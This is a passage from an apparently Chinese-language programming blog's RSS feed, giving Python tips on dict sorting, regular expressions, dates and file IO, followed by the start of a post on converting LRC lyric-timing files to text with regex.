&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;operator&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;itemgetter&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;sorted&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;items&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;itemgetter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;

&lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;Sort dict keys by value&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;

&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;sorted&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;operator&lt;/h1&gt;
&lt;p&gt;&lt;a href="https://docs.python.org/2/library/operator.html"&gt;document&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;让你更方便地使用函数式风格&lt;/p&gt;
&lt;h1&gt;tree&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;collections&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;defaultdict&lt;/span&gt;

&lt;span class="n"&gt;tree&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;lambda&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;defaultdict&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;tree&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="n"&gt;users&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;tree&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;users&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;harold&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;username&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;chopper&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;users&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;matt&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;password&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;hunter2&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;正则表达式&lt;/h1&gt;
&lt;h2&gt;灵活切割字符串&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;asdf fjdk; afed, fjek,asdf, foo&amp;#39;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;re&lt;/span&gt;
&lt;span class="n"&gt;re&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;r&amp;#39;[;,\s]\s*&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;#[&amp;#39;asdf&amp;#39;, &amp;#39;fjdk&amp;#39;, &amp;#39;afed&amp;#39;, &amp;#39;fjek&amp;#39;, &amp;#39;asdf&amp;#39;, &amp;#39;foo&amp;#39;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;匹配和搜索&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;re&lt;/span&gt;
&lt;span class="n"&gt;text&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Today is 11/27/2012. PyCon starts 3/13/2013.&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;datepat&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;re&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;compile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;r&amp;#39;(\d+)/(\d+)/(\d+)&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;match1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;datepat&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;match&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;#match1.groups() =&amp;gt;&amp;#39;NoneType&amp;#39; object has no attribute &amp;#39;groups&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;match2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;datepat&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;search&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;#match.groups() =&amp;gt; (&amp;#39;11&amp;#39;, &amp;#39;27&amp;#39;, &amp;#39;2012&amp;#39;)&lt;/span&gt;
&lt;span class="n"&gt;match3&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;datepat&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;findall&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;#=&amp;gt;[(&amp;#39;11&amp;#39;, &amp;#39;27&amp;#39;, &amp;#39;2012&amp;#39;), (&amp;#39;3&amp;#39;, &amp;#39;13&amp;#39;, &amp;#39;2013&amp;#39;)]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;搜索和替换&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;re&lt;/span&gt;
&lt;span class="n"&gt;datepat&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;re&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;compile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;r&amp;#39;(\d+)/(\d+)/(\d+)&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;datepat&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sub&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;r&amp;#39;\3-\1-\2&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;#更复杂的替换，sub的第一个参数可以是callback，默认传入match对象&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;时间和日期&lt;/h1&gt;
&lt;h2&gt;字符串转换为日期&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;datetime&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;datetime&lt;/span&gt;
&lt;span class="n"&gt;text&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;2012-09-20&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;y&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strptime&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;%Y-%m-&lt;/span&gt;&lt;span class="si"&gt;%d&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;文件IO&lt;/h1&gt;
&lt;h2&gt;读写文本文件&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# Read the entire file as a single string&lt;/span&gt;
&lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;somefile.txt&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;rt&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="c1"&gt;# Iterate over the lines of the file&lt;/span&gt;
&lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;somefile.txt&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;rt&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;line&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="c1"&gt;# process line&lt;/span&gt;
        &lt;span class="o"&gt;...&lt;/span&gt;
&lt;span class="c1"&gt;########&lt;/span&gt;
&lt;span class="c1"&gt;# Write chunks of text data&lt;/span&gt;
&lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;somefile.txt&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;wt&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;text1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;text2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="o"&gt;...&lt;/span&gt;

&lt;span class="c1"&gt;# Redirected print statement&lt;/span&gt;
&lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;somefile.txt&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;wt&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;file&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;file&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="o"&gt;...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;读写json&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;json&lt;/span&gt;

&lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;name&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;ACME&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;shares&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;price&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mf"&gt;542.23&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="n"&gt;json_str&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dumps&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;loads&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;json_str&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;读写csv&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;csv&lt;/span&gt;
&lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;stocks.csv&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;f_csv&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;csv&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;DictReader&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;row&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;f_csv&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="c1"&gt;# process row&lt;/span&gt;
        &lt;span class="c1"&gt;#可以使用列名去访问每一行的数据。如，row[&amp;#39;Symbol&amp;#39;]&lt;/span&gt;

&lt;span class="c1"&gt;#写入&lt;/span&gt;
&lt;span class="n"&gt;headers&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Symbol&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Price&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Date&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Time&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Change&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Volume&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;rows&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;AA&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mf"&gt;39.48&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;6/11/2007&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;9:36am&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mf"&gt;0.18&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;181800&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
         &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;AIG&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mf"&gt;71.38&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;6/11/2007&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;9:36am&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mf"&gt;0.15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;195500&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
         &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;AXP&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mf"&gt;62.58&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;6/11/2007&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;9:36am&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mf"&gt;0.46&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;935000&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
       &lt;span class="p"&gt;]&lt;/span&gt;

&lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;stocks.csv&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;w&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;f_csv&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;csv&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;writer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;f_csv&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;writerow&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;f_csv&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;writerows&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;rows&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;#如果你写入的每一行都是dict，只需要改变writer对象：f_csv = csv.DictWriter(f, headers)    &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;可迭代对象&lt;/h1&gt;
&lt;h2&gt;循环中获取下标&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;index&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;enumerate&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ints&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;index&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;元编程&lt;/h1&gt;
&lt;h2&gt;装饰器&lt;/h2&gt;
&lt;p&gt;wait&lt;/p&gt;
&lt;h2&gt;自省&lt;/h2&gt;
&lt;p&gt;检测一个对象是否包含某个属性：&lt;code&gt;if hasattr(obj, 'attr_name')&lt;/code&gt;&lt;/p&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/brennerm/PyTricks"&gt;PyTricks&lt;/a&gt; ps：没有分类&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/wklken/stackoverflow-py-top-qa"&gt;stackoverflow-py-top-qa&lt;/a&gt;  ps:分类很好&lt;/li&gt;
&lt;li&gt;&lt;a href="http://python3-cookbook.readthedocs.org/"&gt;python3-cookbook&lt;/a&gt;  ps：分类不错&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 27 May 2015 00:00:00 +0000</pubDate><guid>tag:,2015-05-27:python-tricks.html</guid><category>regex</category></item><item><title>正则表达式之处理一组lrc听力文件</title><link>/regex-demo2.html</link><description>&lt;p&gt;我觉得可以写一个「室友需求」系列的文章了 ^_^&lt;/p&gt;
&lt;p&gt;工作缘故，室友时常会处理一些文本文件，手动编辑不胜其烦，于是我又可以有秀代码的机会啦！&lt;/p&gt;
&lt;p&gt;看着自己十几分钟写的代码，能在生产实际中被使用，并且给人家节约大量的时间，嘚瑟的不行啊简直！&lt;/p&gt;
&lt;h1&gt;需求描述&lt;/h1&gt;
&lt;p&gt;此次的任务是处理一批lrc文件:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;转化时间的格式，将[分钟:秒]转化为&lt;code&gt;秒&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;每一个句子前头时间应当包含&lt;code&gt;始末&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;输出txt格式的文件&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;待处理文本&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[00:00.12]section 2.
[00:02.68]you will part of a radio programme about the opening of a new local sports shop.
[00:09.32]first you have some time to look at questions 11 to 16.
[00:39.64]now listen carefully and answer questions 11 to 16.
[00:48.24]now we go to Jane who is going to tell us about what&amp;#39;s happening in town this weekend.
[00:52.24]right,thanks Andrew,
[00:53.92]and now on to what&amp;#39;s new,
[00:56.48]and do we really need yet another sports shop in Bradcaster?
[01:01.24]well,most of you probably know Sports World-
[01:04.44]the branch of a Danish sports goods company that opened a few years ago-
[01:09.04]it&amp;#39;s attracted a lot of custom,
[01:11.36]and so the company has now decided to open another branch in the area.
[01:16.60]it&amp;#39;s going to be in the shopping centre to the west of Bradcaster,
[01:20.44]so that will be good news for all of you who&amp;#39;ve found the original shop in the north of the town hard to get to.
[01:27.12]i was invited to a special preview
[01:29.60]and i can promise you,this is the ultimate in sports retailing.
......
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;目标格式&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0.12      2.68   section 2.
2.68      9.32   you will part of a radio programme about the opening of a new local sports shop.
9.32     39.64   first you have some time to look at questions 11 to 16.
39.64    48.24   now listen carefully and answer questions 11 to 16.
48.24    52.24   now we go to Jane who is going to tell us about what&amp;#39;s happening in town this weekend.
52.24    53.92   right,thanks Andrew,
53.92    56.48   and now on to what&amp;#39;s new,
56.48    61.24   and do we really need yet another sports shop in Bradcaster?
61.24    64.44   well,most of you probably know Sports World-
64.44    69.04   the branch of a Danish sports goods company that opened a few years ago-
69.04    71.36   it&amp;#39;s attracted a lot of custom,
71.36    76.60   and so the company has now decided to open another branch in the area.
76.60    80.44   it&amp;#39;s going to be in the shopping centre to the west of Bradcaster,
80.44    87.12   so that will be good news for all of you who&amp;#39;ve found the original shop in the north of the town hard to get to.
87.12    89.60   i was invited to a special preview
89.60    94.88   and i can promise you,this is the ultimate in sports retailing.
......
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;思路&lt;/h1&gt;
&lt;p&gt;这种问题当然是用正则表达式来解决。比较目标文本格式和待处理文本格式，我们发现，上下两行间需要关联处理，而正则表达式一般是以一行为处理单位的。&lt;/p&gt;
&lt;p&gt;我把这个问题转化为列表迭代的问题。之后匹配替换。all in code。直接读代码吧&lt;/p&gt;
&lt;h1&gt;解决方案（Python版）&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;span class="c1"&gt;# encoding: utf-8&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;re&lt;/span&gt;
